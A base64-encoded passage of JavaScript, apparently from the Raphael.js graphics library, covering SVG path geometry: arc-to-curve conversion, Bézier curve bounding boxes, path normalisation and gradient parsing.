ICAgICAgICAgIHkyID0geHkueTtcbiAgICAgICAgICAgICAgICB2YXIgY29zID0gbWF0aC5jb3MoUEkgLyAxODAgKiBhbmdsZSksXG4gICAgICAgICAgICAgICAgICAgIHNpbiA9IG1hdGguc2luKFBJIC8gMTgwICogYW5nbGUpLFxuICAgICAgICAgICAgICAgICAgICB4ID0gKHgxIC0geDIpIC8gMixcbiAgICAgICAgICAgICAgICAgICAgeSA9ICh5MSAtIHkyKSAvIDI7XG4gICAgICAgICAgICAgICAgdmFyIGggPSAoeCAqIHgpIC8gKHJ4ICogcngpICsgKHkgKiB5KSAvIChyeSAqIHJ5KTtcbiAgICAgICAgICAgICAgICBpZiAoaCA+IDEpIHtcbiAgICAgICAgICAgICAgICAgICAgaCA9IG1hdGguc3FydChoKTtcbiAgICAgICAgICAgICAgICAgICAgcnggPSBoICogcng7XG4gICAgICAgICAgICAgICAgICAgIHJ5ID0gaCAqIHJ5O1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICB2YXIgcngyID0gcnggKiByeCxcbiAgICAgICAgICAgICAgICAgICAgcnkyID0gcnkgKiByeSxcbiAgICAgICAgICAgICAgICAgICAgayA9IChsYXJnZV9hcmNfZmxhZyA9PSBzd2VlcF9mbGFnID8gLTEgOiAxKSAqXG4gICAgICAgICAgICAgICAgICAgICAgICBtYXRoLnNxcnQoYWJzKChyeDIgKiByeTIgLSByeDIgKiB5ICogeSAtIHJ5MiAqIHggKiB4KSAvIChyeDIgKiB5ICogeSArIHJ5MiAqIHggKiB4KSkpLFxuICAgICAgICAgICAgICAgICAgICBjeCA9IGsgKiByeCAqIHkgLyByeSArICh4MSArIHgyKSAvIDIsXG4gICAgICAgICAgICAgICAgICAgIGN5ID0gayAqIC1yeSAqIHggLyByeCArICh5MSArIHkyKSAvIDIsXG4gICAgICAgICAgICAgICAgICAgIGYxID0gbWF0aC5hc2luKCgoeTEgLSBjeSkgLyByeSkudG9GaXhlZCg5KSksXG4gICAgICAgICAgICAgICAgICAgIGYyID0gbWF0aC5hc2luKCgoeTIgLSBjeSkgLyByeSkudG9GaXhlZCg5KSk7XG5cbiAgICAgICAgICAgICAgICBmMSA9IHgxIDwgY3ggPyBQSSAtIGYxIDogZjE7XG4gICAgICAgICAgICAgICAgZjIgPSB4MiA8IGN4ID8gUEkgLSBmMiA6IGYyO1xuICAgICAgICAgICAgICAgIGYxIDwgMCAmJiAoZjEgPSBQSSAqIDIgKyBmMSk7XG4gICAgICAgICAgICAgICAgZjIgPCAwICYmIChmMiA9IFBJICogMiArIGYyKTtcbiAgICAgICAgICAgICAgICBpZiAoc3dlZXBfZmxhZyAmJiBmMSA+IGYyKSB7XG4gICAgICAgICAgICAgICAgICAgIGYxID0gZjEgLSBQSSAqIDI7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIGlmICghc3dlZXBfZmxhZyAmJiBmMiA+IGYxKSB7XG4gICAgICAgICAgICAgICAgICAgIGYyID0gZjIgLSBQSSAqIDI7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICAgICBmMSA9IHJlY3Vyc2l2ZVswXTtcbiAgICAgICAgICAgICAgICBmMiA9IHJlY3Vyc2l2ZVsxXTtcbiAgICAgICAgICAgICAgICBjeCA9IHJlY3Vyc2l2ZVsyXTtcbiAgICAgICAgICAgICAgICBjeSA9IHJlY3Vyc2l2ZVszXTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIHZhciBkZiA9IGYyIC0gZjE7XG4gICAgICAgICAgICBpZiAoYWJzKGRmKSA+IF8xMjApIHtcbiAgICAgICAgICAgICAgICB2YXIgZjJvbGQgPSBmMixcbiAgICAgICAgICAgICAgICAgICAgeDJvbGQgPSB4MixcbiAgICAgICAgICAgICAgICAgICAgeTJvbGQgPSB5MjtcbiAgICAgICAgICAgICAgICBmMiA9IGYxICsgXzEyMCAqIChzd2VlcF9mbGFnICYmIGYyID4gZjEgPyAxIDogLTEpO1xuICAgICAgICAgICAgICAgIHgyID0gY3ggKyByeCAqIG1hdGguY29zKGYyKTtcbiAgICAgICAgICAgICAgICB5MiA9IGN5ICsgcnkgKiBtYXRoLnNpbihmMik7XG4gICAgICAgICAgICAgICAgcmVzID0gYTJjKHgyLCB5MiwgcngsIHJ5LCBhbmdsZSwgMCwgc3dlZXBfZmxhZywgeDJvbGQsIHkyb2xkLCBbZjIsIGYyb2xkLCBjeCwgY3ldKTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIGRmID0gZjIgLSBmMTtcbiAgICAgICAgICAgIHZhciBjMSA9IG1hdGguY29zKGYxKSxcbiAgICAgICAgICAgICAgICBzMSA9IG1hdGguc2luKGYxKSxcbiAgICAgICAgICAgICAgICBjMiA9IG1hdGguY29zKGYyKSxcbiAgICAgICAgICAgICAgICBzMiA9IG1hdGguc2luKGYyKSxcbiAgICAgICAgICAgICAgICB0ID0gbWF0aC50YW4oZGYgLyA0KSxcbiAgICAgICAgICAgICAgICBoeCA9IDQgLyAzICogcnggKiB0LFxuICAgICAgICAgICAgICAgIGh5ID0gNCAvIDMgKiByeSAqIHQsXG4gICAgICAgICAgICAgICAgbTEgPSBbeDEsIHkxXSxcbiAgICAgICAgICAgICAgICBtMiA9IFt4MSArIGh4ICogczEsIHkxIC0gaHkgKiBjMV0sXG4gICAgICAgICAgICAgICAgbTMgPSBbeDIgKyBoeCAqIHMyLCB5MiAtIGh5ICogYzJdLFxuICAgICAgICAgICAgICAgIG00ID0gW3gyLCB5Ml07XG4gICAgICAgICAgICBtMlswXSA9IDIgKiBtMVswXSAtIG0yWzBdO1xuICAgICAgICAgICAgbTJbMV0gPSAyICogbTFbMV0gLSBtMlsxXTtcbiAgICAgICAgICAgIGlmIChyZWN1cnNpdmUpIHtcbiAgICAgICAgICAgICAgICByZXR1cm4gW20yLCBtMywgbTRdW2NvbmNhdF0ocmVzKTtcbiAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgcmVzID0gW20yLCBtMywgbTRdW2NvbmNhdF0ocmVzKS5qb2luKClbc3BsaXRdKFwiLFwiKTtcbiAgICAgICAgICAgICAgICB2YXIgbmV3cmVzID0gW107XG4gICAgICAgICAgICAgICAgZm9yICh2YXIgaSA9IDAsIGlpID0gcmVzLmxlbmd0aDsgaSA8IGlpOyBpKyspIHtcbiAgICAgICAgICAgICAgICAgICAgbmV3cmVzW2ldID0gaSAlIDIgPyByb3RhdGUocmVzW2kgLSAxXSwgcmVzW2ldLCByYWQpLnkgOiByb3RhdGUocmVzW2ldLCByZXNbaSArIDFdLCByYWQpLng7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIHJldHVybiBuZXdyZXM7XG4gICAgICAgICAgICB9XG4gICAgICAgIH0sXG4gICAgICAgIGZpbmREb3RBdFNlZ21lbnQgPSBmdW5jdGlvbiAocDF4LCBwMXksIGMxeCwgYzF5LCBjMngsIGMyeSwgcDJ4LCBwMnksIHQpIHtcbiAgICAgICAgICAgIHZhciB0MSA9IDEgLSB0O1xuICAgICAgICAgICAgcmV0dXJuIHtcbiAgICAgICAgICAgICAgICB4OiBwb3codDEsIDMpICogcDF4ICsgcG93KHQxLCAyKSAqIDMgKiB0ICogYzF4ICsgdDEgKiAzICogdCAqIHQgKiBjMnggKyBwb3codCwgMykgKiBwMngsXG4gICAgICAgICAgICAgICAgeTogcG93KHQxLCAzKSAqIHAxeSArIHBvdyh0MSwgMikgKiAzICogdCAqIGMxeSArIHQxICogMyAqIHQgKiB0ICogYzJ5ICsgcG93KHQsIDMpICogcDJ5XG4gICAgICAgICAgICB9O1xuICAgICAgICB9LFxuICAgICAgICBjdXJ2ZURpbSA9IGNhY2hlcihmdW5jdGlvbiAocDF4LCBwMXksIGMxeCwgYzF5LCBjMngsIGMyeSwgcDJ4LCBwMnkpIHtcbiAgICAgICAgICAgIHZhciBhID0gKGMyeCAtIDIgKiBjMXggKyBwMXgpIC0gKHAyeCAtIDIgKiBjMnggKyBjMXgpLFxuICAgICAgICAgICAgICAgIGIgPSAyICogKGMxeCAtIHAxeCkgLSAyICogKGMyeCAtIGMxeCksXG4gICAgICAgICAgICAgICAgYyA9IHAxeCAtIGMxeCxcbiAgICAgICAgICAgICAgICB0MSA9ICgtYiArIG1hdGguc3FydChiICogYiAtIDQgKiBhICogYykpIC8gMiAvIGEsXG4gICAgICAgICAgICAgICAgdDIgPSAoLWIgLSBtYXRoLnNxcnQoYiAqIGIgLSA0ICogYSAqIGMpKSAvIDIgLyBhLFxuICAgICAgICAgICAgICAgIHkgPSBbcDF5LCBwMnldLFxuICAgICAgICAgICAgICAgIHggPSBbcDF4LCBwMnhdLFxuICAgICAgICAgICAgICAgIGRvdDtcbiAgICAgICAgICAgIGFicyh0MSkgPiBcIjFlMTJcIiAmJiAodDEgPSAuNSk7XG4gICAgICAgICAgICBhYnModDIpID4gXCIxZTEyXCIgJiYgKHQyID0gLjUpO1xuICAgICAgICAgICAgaWYgKHQxID4gMCAmJiB0MSA8IDEpIHtcbiAgICAgICAgICAgICAgICBkb3QgPSBmaW5kRG90QXRTZWdtZW50KHAxeCwgcDF5LCBjMXgsIGMxeSwgYzJ4LCBjMnksIHAyeCwgcDJ5LCB0MSk7XG4gICAgICAgICAgICAgICAgeC5wdXNoKGRvdC54KTtcbiAgICAgICAgICAgICAgICB5LnB1c2goZG90LnkpO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgaWYgKHQyID4gMCAmJiB0MiA8IDEpIHtcbiAgICAgICAgICAgICAgICBkb3QgPSBmaW5kRG90QXRTZWdtZW50KHAxeCwgcDF5LCBjMXgsIGMxeSwgYzJ4LCBjMnksIHAyeCwgcDJ5LCB0Mik7XG4gICAgICAgICAgICAgICAgeC5wdXNoKGRvdC54KTtcbiAgICAgICAgICAgICAgICB5LnB1c2goZG90LnkpO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgYSA9IChjMnkgLSAyICogYzF5ICsgcDF5KSAtIChwMnkgLSAyICogYzJ5ICsgYzF5KTtcbiAgICAgICAgICAgIGIgPSAyICogKGMxeSAtIHAxeSkgLSAyICogKGMyeSAtIGMxeSk7XG4gICAgICAgICAgICBjID0gcDF5IC0gYzF5O1xuICAgICAgICAgICAgdDEgPSAoLWIgKyBtYXRoLnNxcnQoYiAqIGIgLSA0ICogYSAqIGMpKSAvIDIgLyBhO1xuICAgICAgICAgICAgdDIgPSAoLWIgLSBtYXRoLnNxcnQoYiAqIGIgLSA0ICogYSAqIGMpKSAvIDIgLyBhO1xuICAgICAgICAgICAgYWJzKHQxKSA+IFwiMWUxMlwiICYmICh0MSA9IC41KTtcbiAgICAgICAgICAgIGFicyh0MikgPiBcIjFlMTJcIiAmJiAodDIgPSAuNSk7XG4gICAgICAgICAgICBpZiAodDEgPiAwICYmIHQxIDwgMSkge1xuICAgICAgICAgICAgICAgIGRvdCA9IGZpbmREb3RBdFNlZ21lbnQocDF4LCBwMXksIGMxeCwgYzF5LCBjMngsIGMyeSwgcDJ4LCBwMnksIHQxKTtcbiAgICAgICAgICAgICAgICB4LnB1c2goZG90LngpO1xuICAgICAgICAgICAgICAgIHkucHVzaChkb3QueSk7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICBpZiAodDIgPiAwICYmIHQyIDwgMSkge1xuICAgICAgICAgICAgICAgIGRvdCA9IGZpbmREb3RBdFNlZ21lbnQocDF4LCBwMXksIGMxeCwgYzF5LCBjMngsIGMyeSwgcDJ4LCBwMnksIHQyKTtcbiAgICAgICAgICAgICAgICB4LnB1c2goZG90LngpO1xuICAgICAgICAgICAgICAgIHkucHVzaChkb3QueSk7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICByZXR1cm4ge1xuICAgICAgICAgICAgICAgIG1pbjoge3g6IG1taW5bYXBwbHldKDAsIHgpLCB5OiBtbWluW2FwcGx5XSgwLCB5KX0sXG4gICAgICAgICAgICAgICAgbWF4OiB7eDogbW1heFthcHBseV0oMCwgeCksIHk6IG1tYXhbYXBwbHldKDAsIHkpfVxuICAgICAgICAgICAgfTtcbiAgICAgICAgfSksXG4gICAgICAgIHBhdGgyY3VydmUgPSBSLl9wYXRoMmN1cnZlID0gY2FjaGVyKGZ1bmN0aW9uIChwYXRoLCBwYXRoMikge1xuICAgICAgICAgICAgdmFyIHB0aCA9ICFwYXRoMiAmJiBwYXRocyhwYXRoKTtcbiAgICAgICAgICAgIGlmICghcGF0aDIgJiYgcHRoLmN1cnZlKSB7XG4gICAgICAgICAgICAgICAgcmV0dXJuIHBhdGhDbG9uZShwdGguY3VydmUpO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgdmFyIHAgPSBwYXRoVG9BYnNvbHV0ZShwYXRoKSxcbiAgICAgICAgICAgICAgICBwMiA9IHBhdGgyICYmIHBhdGhUb0Fic29sdXRlKHBhdGgyKSxcbiAgICAgICAgICAgICAgICBhdHRycyA9IHt4OiAwLCB5OiAwLCBieDogMCwgYnk6IDAsIFg6IDAsIFk6IDAsIHF4OiBudWxsLCBxeTogbnVsbH0sXG4gICAgICAgICAgICAgICAgYXR0cnMyID0ge3g6IDAsIHk6IDAsIGJ4OiAwLCBieTogMCwgWDogMCwgWTogMCwgcXg6IG51bGwsIHF5OiBudWxsfSxcbiAgICAgICAgICAgICAgICBwcm9jZXNzUGF0aCA9IGZ1bmN0aW9uIChwYXRoLCBkLCBwY29tKSB7XG4gICAgICAgICAgICAgICAgICAgIHZhciBueCwgbnksIHRxID0ge1Q6MSwgUToxfTtcbiAgICAgICAgICAgICAgICAgICAgaWYgKCFwYXRoKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gW1wiQ1wiLCBkLngsIGQueSwgZC54LCBkLnksIGQueCwgZC55XTtcbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAhKHBhdGhbMF0gaW4gdHEpICYmIChkLnF4ID0gZC5xeSA9IG51bGwpO1xuICAgICAgICAgICAgICAgICAgICBzd2l0Y2ggKHBhdGhbMF0pIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgXCJNXCI6XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZC5YID0gcGF0aFsxXTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkLlkgPSBwYXRoWzJdO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSBcIkFcIjpcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXRoID0gW1wiQ1wiXVtjb25jYXRdKGEyY1thcHBseV0oMCwgW2QueCwgZC55XVtjb25jYXRdKHBhdGguc2xpY2UoMSkpKSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgICAgICAgICBjYXNlIFwiU1wiOlxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChwY29tID09IFwiQ1wiIHx8IHBjb20gPT0gXCJTXCIpIHsgLy8gSW4gXCJTXCIgY2FzZSB3ZSBoYXZlIHRvIHRha2UgaW50byBhY2NvdW50LCBpZiB0aGUgcHJldmlvdXMgY29tbWFuZCBpcyBDL1MuXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG54ID0gZC54ICogMiAtIGQuYng7ICAgICAgICAgIC8vIEFuZCByZWZsZWN0IHRoZSBwcmV2aW91c1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBueSA9IGQueSAqIDIgLSBkLmJ5OyAgICAgICAgICAvLyBjb21tYW5kJ3MgY29udHJvbCBwb2ludCByZWxhdGl2ZSB0byB0aGUgY3VycmVudCBwb2ludC5cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7ICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIG9yIHNvbWUgZWxzZSBvciBub3RoaW5nXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG54ID0gZC54O1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBueSA9IGQueTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcGF0aCA9IFtcIkNcIiwgbngsIG55XVtjb25jYXRdKHBhdGguc2xpY2UoMSkpO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSBcIlRcIjpcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAocGNvbSA9PSBcIlFcIiB8fCBwY29tID09IFwiVFwiKSB7IC8vIEluIFwiVFwiIGNhc2Ugd2UgaGF2ZSB0byB0YWtlIGludG8gYWNjb3VudCwgaWYgdGhlIHByZXZpb3VzIGNvbW1hbmQgaXMgUS9ULlxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkLnF4ID0gZC54ICogMiAtIGQucXg7ICAgICAgICAvLyBBbmQgbWFrZSBhIHJlZmxlY3Rpb24gc2ltaWxhclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkLnF5ID0gZC55ICogMiAtIGQucXk7ICAgICAgICAvLyB0byBjYXNlIFwiU1wiLlxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gb3Igc29tZXRoaW5nIGVsc2Ugb3Igbm90aGluZ1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkLnF4ID0gZC54O1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkLnF5ID0gZC55O1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXRoID0gW1wiQ1wiXVtjb25jYXRdKHEyYyhkLngsIGQueSwgZC5xeCwgZC5xeSwgcGF0aFsxXSwgcGF0aFsyXSkpO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSBcIlFcIjpcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkLnF4ID0gcGF0aFsxXTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkLnF5ID0gcGF0aFsyXTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXRoID0gW1wiQ1wiXVtjb25jYXRdKHEyYyhkLngsIGQueSwgcGF0aFsxXSwgcGF0aFsyXSwgcGF0aFszXSwgcGF0aFs0XSkpO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSBcIkxcIjpcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXRoID0gW1wiQ1wiXVtjb25jYXRdKGwyYyhkLngsIGQueSwgcGF0aFsxXSwgcGF0aFsyXSkpO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSBcIkhcIjpcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXRoID0gW1wiQ1wiXVtjb25jYXRdKGwyYyhkLngsIGQueSwgcGF0aFsxXSwgZC55KSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgICAgICAgICBjYXNlIFwiVlwiOlxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhdGggPSBbXCJDXCJdW2NvbmNhdF0obDJjKGQueCwgZC55LCBkLngsIHBhdGhbMV0pKTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgXCJaXCI6XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcGF0aCA9IFtcIkNcIl1bY29uY2F0XShsMmMoZC54LCBkLnksIGQuWCwgZC5ZKSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHBhdGg7XG4gICAgICAgICAgICAgICAgfSxcbiAgICAgICAgICAgICAgICBmaXhBcmMgPSBmdW5jdGlvbiAocHAsIGkpIHtcbiAgICAgICAgICAgICAgICAgICAgaWYgKHBwW2ldLmxlbmd0aCA+IDcpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIHBwW2ldLnNoaWZ0KCk7XG4gICAgICAgICAgICAgICAgICAgICAgICB2YXIgcGkgPSBwcFtpXTtcbiAgICAgICAgICAgICAgICAgICAgICAgIHdoaWxlIChwaS5sZW5ndGgpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwY29tczFbaV09XCJBXCI7IC8vIGlmIGNyZWF0ZWQgbXVsdGlwbGUgQzpzLCB0aGVpciBvcmlnaW5hbCBzZWcgaXMgc2F2ZWRcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwMiAmJiAocGNvbXMyW2ldPVwiQVwiKTsgLy8gdGhlIHNhbWUgYXMgYWJvdmVcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcC5zcGxpY2UoaSsrLCAwLCBbXCJDXCJdW2NvbmNhdF0ocGkuc3BsaWNlKDAsIDYpKSk7XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICBwcC5zcGxpY2UoaSwgMSk7XG4gICAgICAgICAgICAgICAgICAgICAgICBpaSA9IG1tYXgocC5sZW5ndGgsIHAyICYmIHAyLmxlbmd0aCB8fCAwKTtcbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIH0sXG4gICAgICAgICAgICAgICAgZml4TSA9IGZ1bmN0aW9uIChwYXRoMSwgcGF0aDIsIGExLCBhMiwgaSkge1xuICAgICAgICAgICAgICAgICAgICBpZiAocGF0aDEgJiYgcGF0aDIgJiYgcGF0aDFbaV1bMF0gPT0gXCJNXCIgJiYgcGF0aDJbaV1bMF0gIT0gXCJNXCIpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIHBhdGgyLnNwbGljZShpLCAwLCBbXCJNXCIsIGEyLngsIGEyLnldKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIGExLmJ4ID0gMDtcbiAgICAgICAgICAgICAgICAgICAgICAgIGExLmJ5ID0gMDtcbiAgICAgICAgICAgICAgICAgICAgICAgIGExLnggPSBwYXRoMVtpXVsxXTtcbiAgICAgICAgICAgICAgICAgICAgICAgIGExLnkgPSBwYXRoMVtpXVsyXTtcbiAgICAgICAgICAgICAgICAgICAgICAgIGlpID0gbW1heChwLmxlbmd0aCwgcDIgJiYgcDIubGVuZ3RoIHx8IDApO1xuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgfSxcbiAgICAgICAgICAgICAgICBwY29tczEgPSBbXSwgLy8gcGF0aCBjb21tYW5kcyBvZiBvcmlnaW5hbCBwYXRoIHBcbiAgICAgICAgICAgICAgICBwY29tczIgPSBbXSwgLy8gcGF0aCBjb21tYW5kcyBvZiBvcmlnaW5hbCBwYXRoIHAyXG4gICAgICAgICAgICAgICAgcGZpcnN0ID0gXCJcIiwgLy8gdGVtcG9yYXJ5IGhvbGRlciBmb3Igb3JpZ2luYWwgcGF0aCBjb21tYW5kXG4gICAgICAgICAgICAgICAgcGNvbSA9IFwiXCI7IC8vIGhvbGRlciBmb3IgcHJldmlvdXMgcGF0aCBjb21tYW5kIG9mIG9yaWdpbmFsIHBhdGhcbiAgICAgICAgICAgIGZvciAodmFyIGkgPSAwLCBpaSA9IG1tYXgocC5sZW5ndGgsIHAyICYmIHAyLmxlbmd0aCB8fCAwKTsgaSA8IGlpOyBpKyspIHtcbiAgICAgICAgICAgICAgICBwW2ldICYmIChwZmlyc3QgPSBwW2ldWzBdKTsgLy8gc2F2ZSBjdXJyZW50IHBhdGggY29tbWFuZFxuXG4gICAgICAgICAgICAgICAgaWYgKHBmaXJzdCAhPSBcIkNcIikgLy8gQyBpcyBub3Qgc2F2ZWQgeWV0LCBiZWNhdXNlIGl0IG1heSBiZSByZXN1bHQgb2YgY29udmVyc2lvblxuICAgICAgICAgICAgICAgIHtcbiAgICAgICAgICAgICAgICAgICAgcGNvbXMxW2ldID0gcGZpcnN0OyAvLyBTYXZlIGN1cnJlbnQgcGF0aCBjb21tYW5kXG4gICAgICAgICAgICAgICAgICAgIGkgJiYgKCBwY29tID0gcGNvbXMxW2ktMV0pOyAvLyBHZXQgcHJldmlvdXMgcGF0aCBjb21tYW5kIHBjb21cbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgcFtpXSA9IHByb2Nlc3NQYXRoKHBbaV0sIGF0dHJzLCBwY29tKTsgLy8gUHJldmlvdXMgcGF0aCBjb21tYW5kIGlzIGlucHV0dGVkIHRvIHByb2Nlc3NQYXRoXG5cbiAgICAgICAgICAgICAgICBpZiAocGNvbXMxW2ldICE9IFwiQVwiICYmIHBmaXJzdCA9PSBcIkNcIikgcGNvbXMxW2ldID0gXCJDXCI7IC8vIEEgaXMgdGhlIG9ubHkgY29tbWFuZFxuICAgICAgICAgICAgICAgIC8vIHdoaWNoIG1heSBwcm9kdWNlIG11bHRpcGxlIEM6c1xuICAgICAgICAgICAgICAgIC8vIHNvIHdlIGhhdmUgdG8gbWFrZSBzdXJlIHRoYXQgQyBpcyBhbHNvIEMgaW4gb3JpZ2luYWwgcGF0aFxuXG4gICAgICAgICAgICAgICAgZml4QXJjKHAsIGkpOyAvLyBmaXhBcmMgYWRkcyBhbHNvIHRoZSByaWdodCBhbW91bnQgb2YgQTpzIHRvIHBjb21zMVxuXG4gICAgICAgICAgICAgICAgaWYgKHAyKSB7IC8vIHRoZSBzYW1lIHByb2NlZHVyZXMgaXMgZG9uZSB0byBwMlxuICAgICAgICAgICAgICAgICAgICBwMltpXSAmJiAocGZpcnN0ID0gcDJbaV1bMF0pO1xuICAgICAgICAgICAgICAgICAgICBpZiAocGZpcnN0ICE9IFwiQ1wiKVxuICAgICAgICAgICAgICAgICAgICB7XG4gICAgICAgICAgICAgICAgICAgICAgICBwY29tczJbaV0gPSBwZmlyc3Q7XG4gICAgICAgICAgICAgICAgICAgICAgICBpICYmIChwY29tID0gcGNvbXMyW2ktMV0pO1xuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIHAyW2ldID0gcHJvY2Vzc1BhdGgocDJbaV0sIGF0dHJzMiwgcGNvbSk7XG5cbiAgICAgICAgICAgICAgICAgICAgaWYgKHBjb21zMltpXSE9XCJBXCIgJiYgcGZpcnN0PT1cIkNcIikgcGNvbXMyW2ldPVwiQ1wiO1xuXG4gICAgICAgICAgICAgICAgICAgIGZpeEFyYyhwMiwgaSk7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIGZpeE0ocCwgcDIsIGF0dHJzLCBhdHRyczIsIGkpO1xuICAgICAgICAgICAgICAgIGZpeE0ocDIsIHAsIGF0dHJzMiwgYXR0cnMsIGkpO1xuICAgICAgICAgICAgICAgIHZhciBzZWcgPSBwW2ldLFxuICAgICAgICAgICAgICAgICAgICBzZWcyID0gcDIgJiYgcDJbaV0sXG4gICAgICAgICAgICAgICAgICAgIHNlZ2xlbiA9IHNlZy5sZW5ndGgsXG4gICAgICAgICAgICAgICAgICAgIHNlZzJsZW4gPSBwMiAmJiBzZWcyLmxlbmd0aDtcbiAgICAgICAgICAgICAgICBhdHRycy54ID0gc2VnW3NlZ2xlbiAtIDJdO1xuICAgICAgICAgICAgICAgIGF0dHJzLnkgPSBzZWdbc2VnbGVuIC0gMV07XG4gICAgICAgICAgICAgICAgYXR0cnMuYnggPSB0b0Zsb2F0KHNlZ1tzZWdsZW4gLSA0XSkgfHwgYXR0cnMueDtcbiAgICAgICAgICAgICAgICBhdHRycy5ieSA9IHRvRmxvYXQoc2VnW3NlZ2xlbiAtIDNdKSB8fCBhdHRycy55O1xuICAgICAgICAgICAgICAgIGF0dHJzMi5ieCA9IHAyICYmICh0b0Zsb2F0KHNlZzJbc2VnMmxlbiAtIDRdKSB8fCBhdHRyczIueCk7XG4gICAgICAgICAgICAgICAgYXR0cnMyLmJ5ID0gcDIgJiYgKHRvRmxvYXQoc2VnMltzZWcybGVuIC0gM10pIHx8IGF0dHJzMi55KTtcbiAgICAgICAgICAgICAgICBhdHRyczIueCA9IHAyICYmIHNlZzJbc2VnMmxlbiAtIDJdO1xuICAgICAgICAgICAgICAgIGF0dHJzMi55ID0gcDIgJiYgc2VnMltzZWcybGVuIC0gMV07XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICBpZiAoIXAyKSB7XG4gICAgICAgICAgICAgICAgcHRoLmN1cnZlID0gcGF0aENsb25lKHApO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgcmV0dXJuIHAyID8gW3AsIHAyXSA6IHA7XG4gICAgICAgIH0sIG51bGwsIHBhdGhDbG9uZSksXG4gICAgICAgIHBhcnNlRG90cyA9IFIuX3BhcnNlRG90cyA9IGNhY2hlcihmdW5jdGlvbiAoZ3JhZGllbnQpIHtcbiAgICAgICAgICAgIHZhciBkb3RzID0gW107XG4gICAgICAgICAgICBmb3IgKHZhciBpID0gMCwgaWkgPSBncmFkaWVudC5sZW5ndGg7IGkgPCBpaTsgaSsrKSB7XG4gICAgICAgICAgICAgICAgdmFyIGRvdCA9IHt9LFxuICAgI